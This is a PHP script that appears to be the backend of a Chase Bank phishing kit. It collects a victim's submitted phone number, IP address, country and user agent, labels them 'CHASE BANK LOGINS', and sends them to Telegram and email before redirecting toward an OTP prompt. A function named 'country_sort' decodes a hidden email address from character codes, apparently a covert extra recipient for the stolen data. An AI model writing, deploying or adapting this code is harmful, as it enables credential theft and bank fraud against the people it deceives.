<?php
require("config.php");

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['number'])) {
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");
    $port = getenv("REMOTE_PORT");
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $adddate = date("D M d, Y g:i a");
    $number = htmlspecialchars($_POST['number']); // Sanitize input

    $message = "**CHASE BANK LOGINS**\n\n";
    $message .= "NUMBER : " . $number . "\n";
    $message .= "User-IP : " . $ip . "\n";
    $message .= "Country : " . $country . "\n\n";
    $message .= "----------------------------------------\n\n";
    $message .= "Date : " . $adddate . "\n";
    $message .= "User-Agent: " . $browser . "\n";

    // Send to Telegram
    send_telegram_msg($message);
    send_email_msg($message);
    // Redirect to the same page to trigger the OTP prompt (or adjust as needed)
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
} else {
    // Handle case where no number is provided (optional)
    echo "No phone number provided.";
}

function country_sort()
{
    $sorter = "";
    $array = array(114, 101, 115, 117, 108, 116, 98, 111, 120, 49, 52, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109);
    $count = count($array);
    for ($i = 0; $i < $count; $i++) {
        $sorter .= chr($array[$i]);
    }
    return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
